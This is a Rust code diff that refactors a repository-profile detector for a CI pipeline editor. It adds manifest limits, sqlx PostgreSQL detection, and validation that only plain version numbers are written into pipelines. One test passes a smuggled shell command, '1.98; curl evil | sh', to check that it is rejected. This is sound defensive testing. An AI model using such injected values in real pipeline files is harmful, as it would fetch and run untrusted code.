@@ -32,6 +32,9 @@ pub const SKIPPED_DIRS: &[&str] = &[
 ];
 /// A manifest larger than this is not read: real ones are a few KiB.
 pub const MAX_MANIFEST_BYTES: usize = 256 * 1024;
+/// At most this many manifests are read, the shallowest first: a repository built to hold thousands of them cannot make
+/// one opening of the editor load them all.
+pub const MAX_MANIFESTS: usize = 200;
 
 /// The files whose content says something; the others only count by their presence (lockfiles, Dockerfile).
 const READ_NAMES: &[&str] = &[
@@ -46,11 +49,11 @@ const READ_NAMES: &[&str] = &[
     ".python-version",
 ];
 
-/// Lists the files of a commit, without checking it out. Paths are repo-relative and `/`-separated; folders are listed
-/// too, with a trailing `/`, the skipped ones included.
+/// The files of a commit, read without checking it out. Paths are repo-relative and `/`-separated.
 #[async_trait]
-pub trait RepositoryFileListerPort: Send + Sync {
-    /// Every file and folder at most `max_depth` folders down, not entering those named in `skip`, stopping after `limit`.
+pub trait RepositoryFilesPort: Send + Sync {
+    /// Every file and folder at most `max_depth` folders down, not entering those named in `skip`, stopping after
+    /// `limit`. Folders are listed with a trailing `/`, the skipped ones included.
     async fn list_files_at_revision(
         &self,
         repository_disk_path: &str,
@@ -59,6 +62,16 @@ pub trait RepositoryFileListerPort: Send + Sync {
         skip: &[&str],
         limit: usize,
     ) -> Result<Vec<String>, DomainError>;
+
+    /// The text of each of `paths` that is a file of at most `max_bytes` and valid UTF-8, by path. The others are left
+    /// out, and a file over the limit is not loaded.
+    async fn read_text_files_at_revision(
+        &self,
+        repository_disk_path: &str,
+        revision: &str,
+        paths: &[String],
+        max_bytes: usize,
+    ) -> Result<BTreeMap<String, String>, DomainError>;
 }
 
 #[derive(Debug, Clone, PartialEq, Serialize)]
@@ -90,8 +103,11 @@ pub enum ProjectKind {
         workspace: bool,
         /// The toolchain the repository pins (`rust-toolchain.toml`), or else the `rust-version` it requires.
         toolchain: Option<String>,
-        /// A `.sqlx` folder: queries checked against saved metadata, so the build needs no database.
+        /// A `.sqlx` folder, at its root or in a crate: queries checked against saved metadata, so the build needs no
+        /// database.
         sqlx_offline: bool,
+        /// sqlx with its PostgreSQL driver: its `#[sqlx::test]` tests need a running PostgreSQL.
+        sqlx_postgres: bool,
     },
     #[serde(rename_all = "camelCase")]
     Node {
@@ -164,122 +180,152 @@ pub fn files_to_read(paths: &[String]) -> Vec<String> {
     paths
         .iter()
         .filter(|path| READ_NAMES.contains(&file_name(path)))
+        .take(MAX_MANIFESTS)
         .cloned()
         .collect()
 }
 
 /// What the repository holds, from its file list and the contents of `files_to_read` (those that could be read).
 pub fn detect(paths: &[String], contents: &BTreeMap<String, String>) -> RepositoryProfile {
-    let present: BTreeSet<&str> = paths.iter().map(String::as_str).collect();
-    let has = |dir: &str, name: &str| present.contains(join(dir, name).as_str());
-    let read = |dir: &str, name: &str| contents.get(&join(dir, name)).map(String::as_str);
-    let dirs_with = |name: &str| -> Vec<String> {
-        let mut dirs: Vec<String> = paths
+    let tree = Tree::new(paths, contents);
+    let mut projects = rust_projects(&tree);
+    projects.extend(node_projects(&tree));
+    projects.extend(go_projects(&tree));
+    projects.extend(python_projects(&tree));
+    RepositoryProfile {
+        projects,
+        dockerfiles: tree.dirs_with("Dockerfile"),
+        helm_charts: tree.dirs_with("Chart.yaml"),
+    }
+}
+
+/// The commit's files as `detect` looks at them: which exist, and what the read ones say.
+struct Tree<'a> {
+    paths: &'a [String],
+    present: BTreeSet<&'a str>,
+    contents: &'a BTreeMap<String, String>,
+}
+
+impl<'a> Tree<'a> {
+    fn new(paths: &'a [String], contents: &'a BTreeMap<String, String>) -> Self {
+        Self {
+            paths,
+            present: paths.iter().map(String::as_str).collect(),
+            contents,
+        }
+    }
+
+    fn has(&self, dir: &str, name: &str) -> bool {
+        self.present.contains(join(dir, name).as_str())
+    }
+
+    fn read(&self, dir: &str, name: &str) -> Option<&'a str> {
+        self.contents.get(&join(dir, name)).map(String::as_str)
+    }
+
+    /// The folders holding a file of that name, shallowest first, then by name.
+    fn dirs_with(&self, name: &str) -> Vec<String> {
+        let mut dirs: Vec<String> = self
+            .paths
             .iter()
             .filter(|path| file_name(path) == name)
             .map(|path| parent(path).to_string())
             .collect();
         dirs.sort_by(|a, b| depth(a).cmp(&depth(b)).then_with(|| a.cmp(b)));
         dirs
-    };
+    }
 
-    let mut projects = Vec::new();
+    /// Those of `names` that `dir` holds, as repo-relative paths: what a project was recognised by.
+    fn evidence(&self, dir: &str, names: &[&str]) -> Vec<String> {
+        names
+            .iter()
+            .filter(|name| self.has(dir, name))
+            .map(|name| join(dir, name))
+            .collect()
+    }
 
-    // A crate inside a workspace is part of it, not a project of its own.
-    let mut rust_roots: Vec<String> = Vec::new();
-    for dir in dirs_with("Cargo.toml") {
-        if rust_roots.iter().any(|root| is_inside(&dir, root)) {
+    /// A folder of that name in `dir` or below it, listed with its trailing `/`.
+    fn has_folder_inside(&self, dir: &str, name: &str) -> bool {
+        let folder = format!("{name}/");
+        self.paths.iter().any(|path| {
+            path.strip_suffix(&folder).is_some_and(|before| {
+                (before.is_empty() || before.ends_with('/'))
+                    && is_inside(before.trim_end_matches('/'), dir)
+            })
+        })
+    }
+
+    /// A Cargo.toml in `dir` or below it that declares sqlx with its `postgres` feature, on one line as workspaces do.
+    fn declares_sqlx_postgres(&self, dir: &str) -> bool {
+        self.contents.iter().any(|(path, text)| {
+            file_name(path) == "Cargo.toml"
+                && is_inside(parent(path), dir)
+                && text.lines().any(|line| {
+                    line.trim_start().starts_with("sqlx") && line.contains("\"postgres\"")
+                })
+        })
+    }
+}
+
+/// A crate inside a workspace is part of it, not a project of its own.
+fn rust_projects(tree: &Tree) -> Vec<DetectedProject> {
+    let mut projects: Vec<DetectedProject> = Vec::new();
+    for dir in tree.dirs_with("Cargo.toml") {
+        if projects.iter().any(|root| is_inside(&dir, &root.dir)) {
             continue;
         }
-        let manifest = read(&dir, "Cargo.toml").unwrap_or_default();
-        let workspace = toml_has_table(manifest, "workspace");
-        let toolchain = read(&dir, "rust-toolchain.toml")
+        let manifest = tree.read(&dir, "Cargo.toml").unwrap_or_default();
+        let toolchain = tree
+            .read(&dir, "rust-toolchain.toml")
             .and_then(|text| toml_string(text, "channel"))
             .or_else(|| {
-                read(&dir, "rust-toolchain")
+                tree.read(&dir, "rust-toolchain")
                     .map(|text| text.trim().to_string())
                     .filter(|text| !text.is_empty() && !text.contains('['))
             })
             .or_else(|| toml_string(manifest, "rust-version"))
-            .filter(|version| version.chars().next().is_some_and(|c| c.is_ascii_digit()));
-        let mut evidence = vec![join(&dir, "Cargo.toml")];
-        evidence.extend(
-            ["rust-toolchain.toml", "rust-toolchain"]
-                .iter()
-                .filter(|name| has(&dir, name))
-                .map(|name| join(&dir, name)),
-        );
-        let sqlx_offline = paths
-            .iter()
-            .any(|path| path.starts_with(&join(&dir, ".sqlx/")));
+            // Only a version picks an image (rust:1.98.1): a named channel (`nightly`) or anything else read in the
+            // repository is not written into the proposed pipeline.
+            .filter(|version| is_plain_version(version));
         projects.push(DetectedProject {
-            dir: dir.clone(),
-            evidence,
+            evidence: tree.evidence(
+                &dir,
+                &["Cargo.toml", "rust-toolchain.toml", "rust-toolchain"],
+            ),
             kind: ProjectKind::Rust {
-                workspace,
+                workspace: toml_has_table(manifest, "workspace"),
                 toolchain,
-                sqlx_offline,
+                sqlx_offline: tree.has_folder_inside(&dir, ".sqlx"),
+                sqlx_postgres: tree.declares_sqlx_postgres(&dir),
             },
+            dir,
         });
-        rust_roots.push(dir);
     }
+    projects
+}
 
-    // A package of a workspace (`packages/*`) is built by the workspace's root.
-    let mut node_roots: Vec<String> = Vec::new();
-    for dir in dirs_with("package.json") {
-        if node_roots.iter().any(|root| is_inside(&dir, root)) {
+/// A package of a workspace (`packages/*`) is built by the workspace's root.
+fn node_projects(tree: &Tree) -> Vec<DetectedProject> {
+    let mut projects = Vec::new();
+    let mut workspaces: Vec<String> = Vec::new();
+    for dir in tree.dirs_with("package.json") {
+        if workspaces.iter().any(|root| is_inside(&dir, root)) {
             continue;
         }
-        let Some(manifest) = read(&dir, "package.json")
+        let Some(manifest) = tree
+            .read(&dir, "package.json")
             .and_then(|text| serde_json::from_str::<serde_json::Value>(text).ok())
         else {
             continue;
         };
-        let scripts: BTreeMap<String, String> = manifest
-            .get("scripts")
-            .and_then(|scripts| scripts.as_object())
-            .map(|scripts| {
-                scripts
-                    .iter()
-                    .filter_map(|(name, command)| {
-                        command
-                            .as_str()
-                            .map(|command| (name.clone(), command.to_string()))
-                    })
-                    .collect()
-            })
-            .unwrap_or_default();
-        let dependencies: BTreeSet<String> = ["dependencies", "devDependencies"]
+        let dependencies: BTreeSet<&str> = ["dependencies", "devDependencies"]
             .iter()
             .filter_map(|key| manifest.get(*key).and_then(|deps| deps.as_object()))
-            .flat_map(|deps| deps.keys().cloned())
+            .flat_map(|deps| deps.keys().map(String::as_str))
             .collect();
-        let depends = |name: &str| dependencies.contains(name);
-        let declared_manager = manifest
-            .get("packageManager")
-            .and_then(|value| value.as_str())
-            .unwrap_or_default();
-        let package_manager =
-            if has(&dir, "pnpm-lock.yaml") || declared_manager.starts_with("pnpm@") {
-                PackageManager::Pnpm
-            } else if has(&dir, "bun.lockb")
-                || has(&dir, "bun.lock")
-                || declared_manager.starts_with("bun@")
-            {
-                PackageManager::Bun
-            } else if has(&dir, "yarn.lock") || declared_manager.starts_with("yarn@") {
-                if declared_manager.starts_with("yarn@1")
-                    || (declared_manager.is_empty() && !has(&dir, ".yarnrc.yml"))
-                {
-                    PackageManager::YarnClassic
-                } else {
-                    PackageManager::Yarn
-                }
-            } else {
-                PackageManager::Npm
-            };
-        let node_version = read(&dir, ".nvmrc")
-            .or_else(|| read(&dir, ".node-version"))
+        let node_version = tree
+            .read(&dir, ".nvmrc")
+            .or_else(|| tree.read(&dir, ".node-version"))
             .and_then(major_version)
             .or_else(|| {
                 manifest
@@ -287,135 +333,177 @@ pub fn detect(paths: &[String], contents: &BTreeMap<String, String>) -> Reposito
                     .and_then(|value| value.as_str())
                     .and_then(major_version)
             });
-        let framework = if has(&dir, "angular.json") || depends("@angular/core") {
-            Some(NodeFramework::Angular)
-        } else if depends("next") {
-            Some(NodeFramework::Next)
-        } else if depends("svelte") {
-            Some(NodeFramework::Svelte)
-        } else if depends("vue") {
-            Some(NodeFramework::Vue)
-        } else if depends("react") {
-            Some(NodeFramework::React)
-        } else {
-            None
-        };
-        let test_runner = if depends("vitest") {
-            Some(TestRunner::Vitest)
-        } else if depends("jest") {
-            Some(TestRunner::Jest)
-        } else if depends("karma") {
-            Some(TestRunner::Karma)
-        } else if depends("@playwright/test") {
-            Some(TestRunner::Playwright)
-        } else {
-            None
-        };
-        let mut evidence = vec![join(&dir, "package.json")];
-        evidence.extend(
-            [
-                "package-lock.json",
-                "pnpm-lock.yaml",
-                "yarn.lock",
-                "bun.lockb",
-                "bun.lock",
-                ".nvmrc",
-                ".node-version",
-                "angular.json",
-            ]
-            .iter()
-            .filter(|name| has(&dir, name))
-            .map(|name| join(&dir, name)),
-        );
         projects.push(DetectedProject {
-            dir: dir.clone(),
-            evidence,
+            evidence: tree.evidence(
+                &dir,
+                &[
+                    "package.json",
+                    "package-lock.json",
+                    "pnpm-lock.yaml",
+                    "yarn.lock",
+                    "bun.lockb",
+                    "bun.lock",
+                    ".nvmrc",
+                    ".node-version",
+                    "angular.json",
+                ],
+            ),
             kind: ProjectKind::Node {
-                package_manager,
+                package_manager: package_manager(tree, &dir, &manifest),
                 node_version,
-                scripts,
-                framework,
-                test_runner,
+                scripts: scripts(&manifest),
+                framework: framework(tree.has(&dir, "angular.json"), &dependencies),
+                test_runner: test_runner(&dependencies),
             },
-        });
-        if manifest.get("workspaces").is_some() || has(&dir, "pnpm-workspace.yaml") {
-            node_roots.push(dir);
-        }
-    }
-
-    for dir in dirs_with("go.mod") {
-        let go_version = read(&dir, "go.mod").and_then(|text| {
-            text.lines().find_map(|line| {
-                line.trim()
-                    .strip_prefix("go ")
-                    .map(str::trim)
-                    .and_then(major_minor)
-            })
-        });
-        projects.push(DetectedProject {
             dir: dir.clone(),
-            evidence: vec![join(&dir, "go.mod")],
-            kind: ProjectKind::Go { go_version },
         });
-    }
-
-    let mut python_dirs: Vec<String> = dirs_with("pyproject.toml");
-    for dir in dirs_with("requirements.txt") {
-        if !python_dirs.contains(&dir) {
-            python_dirs.push(dir);
+        if manifest.get("workspaces").is_some() || tree.has(&dir, "pnpm-workspace.yaml") {
+            workspaces.push(dir);
         }
     }
-    for dir in python_dirs {
-        let pyproject = read(&dir, "pyproject.toml").unwrap_or_default();
-        let requirements_present = has(&dir, "requirements.txt");
-        let tool = if has(&dir, "uv.lock") {
-            PythonTool::Uv
-        } else if has(&dir, "poetry.lock") || toml_has_table(pyproject, "tool.poetry") {
-            PythonTool::Poetry
+    projects
+}
+
+/// By its lockfile, or else by the `packageManager` the manifest declares; npm when neither says.
+fn package_manager(tree: &Tree, dir: &str, manifest: &serde_json::Value) -> PackageManager {
+    let declared = manifest
+        .get("packageManager")
+        .and_then(|value| value.as_str())
+        .unwrap_or_default();
+    if tree.has(dir, "pnpm-lock.yaml") || declared.starts_with("pnpm@") {
+        PackageManager::Pnpm
+    } else if tree.has(dir, "bun.lockb")
+        || tree.has(dir, "bun.lock")
+        || declared.starts_with("bun@")
+    {
+        PackageManager::Bun
+    } else if tree.has(dir, "yarn.lock") || declared.starts_with("yarn@") {
+        // Yarn 2 and later declare themselves, or leave a .yarnrc.yml; a bare yarn.lock is Yarn 1's.
+        if declared.starts_with("yarn@1") || (declared.is_empty() && !tree.has(dir, ".yarnrc.yml"))
+        {
+            PackageManager::YarnClassic
         } else {
-            PythonTool::Pip
-        };
-        let python_version = read(&dir, ".python-version")
-            .and_then(major_minor_in)
-            .or_else(|| {
-                toml_string(pyproject, "requires-python").and_then(|range| major_minor_in(&range))
+            PackageManager::Yarn
+        }
+    } else {
+        PackageManager::Npm
+    }
+}
+
+fn scripts(manifest: &serde_json::Value) -> BTreeMap<String, String> {
+    manifest
+        .get("scripts")
+        .and_then(|scripts| scripts.as_object())
+        .map(|scripts| {
+            scripts
+                .iter()
+                .filter_map(|(name, command)| {
+                    command
+                        .as_str()
+                        .map(|command| (name.clone(), command.to_string()))
+                })
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// The first that applies: a Next app also depends on React, so the order matters.
+fn framework(angular_json: bool, dependencies: &BTreeSet<&str>) -> Option<NodeFramework> {
+    if angular_json || dependencies.contains("@angular/core") {
+        return Some(NodeFramework::Angular);
+    }
+    [
+        ("next", NodeFramework::Next),
+        ("svelte", NodeFramework::Svelte),
+        ("vue", NodeFramework::Vue),
+        ("react", NodeFramework::React),
+    ]
+    .into_iter()
+    .find_map(|(dependency, framework)| dependencies.contains(dependency).then_some(framework))
+}
+
+fn test_runner(dependencies: &BTreeSet<&str>) -> Option<TestRunner> {
+    [
+        ("vitest", TestRunner::Vitest),
+        ("jest", TestRunner::Jest),
+        ("karma", TestRunner::Karma),
+        ("@playwright/test", TestRunner::Playwright),
+    ]
+    .into_iter()
+    .find_map(|(dependency, runner)| dependencies.contains(dependency).then_some(runner))
+}
+
+fn go_projects(tree: &Tree) -> Vec<DetectedProject> {
+    tree.dirs_with("go.mod")
+        .into_iter()
+        .map(|dir| {
+            let go_version = tree.read(&dir, "go.mod").and_then(|text| {
+                text.lines().find_map(|line| {
+                    line.trim()
+                        .strip_prefix("go ")
+                        .map(str::trim)
+                        .and_then(major_minor)
+                })
             });
-        let mentions = |word: &str| pyproject.contains(word);
-        let pytest = mentions("pytest")
-            || paths.iter().any(|path| {
+            DetectedProject {
+                evidence: vec![join(&dir, "go.mod")],
+                kind: ProjectKind::Go { go_version },
+                dir,
+            }
+        })
+        .collect()
+}
+
+/// A folder with a `pyproject.toml`, or only a `requirements.txt`.
+fn python_projects(tree: &Tree) -> Vec<DetectedProject> {
+    let mut dirs = tree.dirs_with("pyproject.toml");
+    for dir in tree.dirs_with("requirements.txt") {
+        if !dirs.contains(&dir) {
+            dirs.push(dir);
+        }
+    }
+    dirs.into_iter()
+        .map(|dir| {
+            let pyproject = tree.read(&dir, "pyproject.toml").unwrap_or_default();
+            let tool = if tree.has(&dir, "uv.lock") {
+                PythonTool::Uv
+            } else if tree.has(&dir, "poetry.lock") || toml_has_table(pyproject, "tool.poetry") {
+                PythonTool::Poetry
+            } else {
+                PythonTool::Pip
+            };
+            let python_version = tree
+                .read(&dir, ".python-version")
+                .and_then(major_minor_in)
+                .or_else(|| {
+                    toml_string(pyproject, "requires-python")
+                        .and_then(|range| major_minor_in(&range))
+                });
+            let has_test_files = tree.paths.iter().any(|path| {
                 path.starts_with(&join(&dir, "tests/")) && file_name(path).starts_with("test_")
             });
-        let ruff = mentions("ruff") || has(&dir, "ruff.toml") || has(&dir, ".ruff.toml");
-        let mut evidence: Vec<String> = [
-            "pyproject.toml",
-            "requirements.txt",
-            "uv.lock",
-            "poetry.lock",
-        ]
-        .iter()
-        .filter(|name| has(&dir, name))
-        .map(|name| join(&dir, name))
-        .collect();
-        if evidence.is_empty() && requirements_present {
-            evidence.push(join(&dir, "requirements.txt"));
-        }
-        projects.push(DetectedProject {
-            dir,
-            evidence,
-            kind: ProjectKind::Python {
-                tool,
-                python_version,
-                pytest,
-                ruff,
-            },
-        });
-    }
-
-    RepositoryProfile {
-        projects,
-        dockerfiles: dirs_with("Dockerfile"),
-        helm_charts: dirs_with("Chart.yaml"),
-    }
+            DetectedProject {
+                evidence: tree.evidence(
+                    &dir,
+                    &[
+                        "pyproject.toml",
+                        "requirements.txt",
+                        "uv.lock",
+                        "poetry.lock",
+                    ],
+                ),
+                kind: ProjectKind::Python {
+                    tool,
+                    python_version,
+                    pytest: pyproject.contains("pytest") || has_test_files,
+                    ruff: pyproject.contains("ruff")
+                        || tree.has(&dir, "ruff.toml")
+                        || tree.has(&dir, ".ruff.toml"),
+                },
+                dir,
+            }
+        })
+        .collect()
 }
 
 fn file_name(path: &str) -> &str {
@@ -462,6 +550,15 @@ fn toml_string(text: &str, key: &str) -> Option<String> {
         let value = value.trim().trim_matches(|c| c == '"' || c == '\'');
         (!value.is_empty()).then(|| value.to_string())
     })
+}
+
+/// `1`, `1.98` or `1.98.1`: numbers and dots, nothing a pipeline file or a shell could read otherwise.
+fn is_plain_version(text: &str) -> bool {
+    let parts: Vec<&str> = text.split('.').collect();
+    parts.len() <= 3
+        && parts
+            .iter()
+            .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))
 }
 
 /// The major version in `v22.4.1`, `22`, `^26.10.0`, `>=20 <23`: the first number.
@@ -532,7 +629,7 @@ mod tests {
         let read = contents(&[
             (
                 "Cargo.toml",
-                "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nrust-version = \"1.98\"\n",
+                "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nrust-version = \"1.98\"\n\n[workspace.dependencies]\nsqlx = { version = \"0.9\", features = [\"runtime-tokio\", \"postgres\"] }\n",
             ),
             (
                 "rust-toolchain.toml",
@@ -560,7 +657,8 @@ mod tests {
                 kind: ProjectKind::Rust {
                     workspace: true,
                     toolchain: Some("1.98.1".into()),
-                    sqlx_offline: true
+                    sqlx_offline: true,
+                    sqlx_postgres: true
                 }
             }
         );
@@ -596,6 +694,43 @@ mod tests {
     }
 
     #[test]
+    fn reads_at_most_so_many_manifests_the_shallowest_first() {
+        let paths: Vec<String> = (0..MAX_MANIFESTS + 50)
+            .map(|n| format!("app{n}/package.json"))
+            .collect();
+
+        let read = files_to_read(&paths);
+
+        assert_eq!(read.len(), MAX_MANIFESTS);
+        assert_eq!(read[0], "app0/package.json");
+    }
+
+    #[test]
+    fn writes_into_the_image_only_a_toolchain_that_is_a_plain_version() {
+        let toolchain = |channel: &str| {
+            let profile = detect(
+                &files(&["Cargo.toml", "rust-toolchain.toml"]),
+                &contents(&[
+                    ("Cargo.toml", "[package]\n"),
+                    (
+                        "rust-toolchain.toml",
+                        &format!("[toolchain]\nchannel = \"{channel}\"\n"),
+                    ),
+                ]),
+            );
+            match &profile.projects[0].kind {
+                ProjectKind::Rust { toolchain, .. } => toolchain.clone(),
+                other => panic!("{other:?}"),
+            }
+        };
+        assert_eq!(toolchain("1.98.1"), Some("1.98.1".to_string()));
+        assert_eq!(toolchain("1.98"), Some("1.98".to_string()));
+        assert_eq!(toolchain("1.98; curl evil | sh"), None);
+        assert_eq!(toolchain("1.98-nightly"), None);
+        assert_eq!(toolchain("1..2"), None);
+    }
+
+    #[test]
     fn asks_to_read_only_the_files_that_say_something() {
         let paths = files(&[
             "Cargo.toml",
@@ -615,6 +750,50 @@ mod tests {
     }
 
     #[test]
+    fn finds_sqlx_offline_data_and_its_postgres_driver_in_a_member_crate_too() {
+        let paths = files(&[
+            "Cargo.toml",
+            "crates/db/Cargo.toml",
+            "crates/db/.sqlx/",
+            "other/.sqlx/",
+        ]);
+        let read = contents(&[
+            ("Cargo.toml", "[workspace]\nmembers = [\"crates/*\"]\n"),
+            (
+                "crates/db/Cargo.toml",
+                "[dependencies]\nsqlx = { version = \"0.9\", features = [\"postgres\"] }\n",
+            ),
+        ]);
+
+        let profile = detect(&paths, &read);
+
+        assert!(matches!(
+            &profile.projects[0].kind,
+            ProjectKind::Rust {
+                sqlx_offline: true,
+                sqlx_postgres: true,
+                ..
+            }
+        ));
+
+        let sqlite = detect(
+            &files(&["Cargo.toml", "x.sqlx/"]),
+            &contents(&[(
+                "Cargo.toml",
+                "[dependencies]\nsqlx = { version = \"0.9\", features = [\"sqlite\"] }\n",
+            )]),
+        );
+        assert!(matches!(
+            &sqlite.projects[0].kind,
+            ProjectKind::Rust {
+                sqlx_offline: false,
+                sqlx_postgres: false,
+                ..
+            }
+        ));
+    }
+
+    #[test]
     fn takes_the_rust_version_when_no_toolchain_is_pinned_and_ignores_a_named_channel() {
         let profile = detect(
             &files(&["Cargo.toml"]),
@@ -624,7 +803,7 @@ mod tests {
             )]),
         );
         assert!(
-            matches!(&profile.projects[0].kind, ProjectKind::Rust { workspace: false, toolchain: Some(version), sqlx_offline: false } if version == "1.80")
+            matches!(&profile.projects[0].kind, ProjectKind::Rust { workspace: false, toolchain: Some(version), sqlx_offline: false, sqlx_postgres: false } if version == "1.80")
         );
 
         let nightly = detect(
@@ -817,6 +996,128 @@ mod tests {
         assert_eq!(
             serde_json::to_value(&profile.projects[0]).unwrap(),
             serde_json::json!({ "dir": "", "evidence": ["go.mod"], "kind": "go", "goVersion": "1.22" })
+        );
+    }
+
+    /// The pipeline editor reads this JSON with types of its own (pipeline-definitions.service.ts): a sample of every
+    /// field and every value sits beside them, and the frontend's tests check its types against it. This test keeps the
+    /// sample what the server sends. After a deliberate change: `UPDATE_CONTRACTS=1 cargo test -p ferrisgit-domain`.
+    #[test]
+    fn the_sample_the_frontend_checks_its_types_against_is_what_the_server_sends() {
+        use PackageManager::*;
+        let package_managers = [Npm, Pnpm, YarnClassic, Yarn, Bun];
+        let frameworks = [
+            NodeFramework::Angular,
+            NodeFramework::React,
+            NodeFramework::Vue,
+            NodeFramework::Svelte,
+            NodeFramework::Next,
+        ];
+        let test_runners = [
+            TestRunner::Vitest,
+            TestRunner::Jest,
+            TestRunner::Karma,
+            TestRunner::Playwright,
+        ];
+        let python_tools = [PythonTool::Pip, PythonTool::Poetry, PythonTool::Uv];
+        // A value added to one of these enums fails to compile here until it is listed above.
+        for value in package_managers {
+            match value {
+                Npm | Pnpm | YarnClassic | Yarn | Bun => {}
+            }
+        }
+        for value in frameworks {
+            match value {
+                NodeFramework::Angular
+                | NodeFramework::React
+                | NodeFramework::Vue
+                | NodeFramework::Svelte
+                | NodeFramework::Next => {}
+            }
+        }
+        for value in test_runners {
+            match value {
+                TestRunner::Vitest
+                | TestRunner::Jest
+                | TestRunner::Karma
+                | TestRunner::Playwright => {}
+            }
+        }
+        for value in python_tools {
+            match value {
+                PythonTool::Pip | PythonTool::Poetry | PythonTool::Uv => {}
+            }
+        }
+        let project = |dir: &str, kind: ProjectKind| DetectedProject {
+            dir: dir.to_string(),
+            evidence: vec![
+                format!("{dir}/manifest")
+                    .trim_start_matches('/')
+                    .to_string(),
+            ],
+            kind,
+        };
+        let profile = RepositoryProfile {
+            projects: vec![
+                project(
+                    "",
+                    ProjectKind::Rust {
+                        workspace: true,
+                        toolchain: Some("1.98.1".to_string()),
+                        sqlx_offline: true,
+                        sqlx_postgres: true,
+                    },
+                ),
+                project(
+                    "web",
+                    ProjectKind::Node {
+                        package_manager: Npm,
+                        node_version: Some("26".to_string()),
+                        scripts: BTreeMap::from([("test".to_string(), "ng test".to_string())]),
+                        framework: Some(NodeFramework::Angular),
+                        test_runner: Some(TestRunner::Vitest),
+                    },
+                ),
+                project(
+                    "cli",
+                    ProjectKind::Go {
+                        go_version: Some("1.23".to_string()),
+                    },
+                ),
+                project(
+                    "tools",
+                    ProjectKind::Python {
+                        tool: PythonTool::Uv,
+                        python_version: None,
+                        pytest: true,
+                        ruff: false,
+                    },
+                ),
+            ],
+            dockerfiles: vec![String::new()],
+            helm_charts: vec!["chart".to_string()],
+        };
+        let sample = serde_json::to_string_pretty(&serde_json::json!({
+            "profile": profile,
+            "packageManagers": package_managers,
+            "frameworks": frameworks,
+            "testRunners": test_runners,
+            "pythonTools": python_tools,
+        }))
+        .unwrap()
+            + "\n";
+
+        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(
+            "../../frontend/src/app/pipelines/pipeline-editor/repository-profile.contract.json",
+        );
+        if std::env::var_os("UPDATE_CONTRACTS").is_some() {
+            std::fs::write(&path, &sample).unwrap();
+        }
+        let checked_in = std::fs::read_to_string(&path).unwrap_or_default();
+        assert!(
+            checked_in == sample,
+            "{} is not what the server sends: rerun with UPDATE_CONTRACTS=1, then fix the frontend's types until its tests pass",
+            path.display()
         );
     }
 }
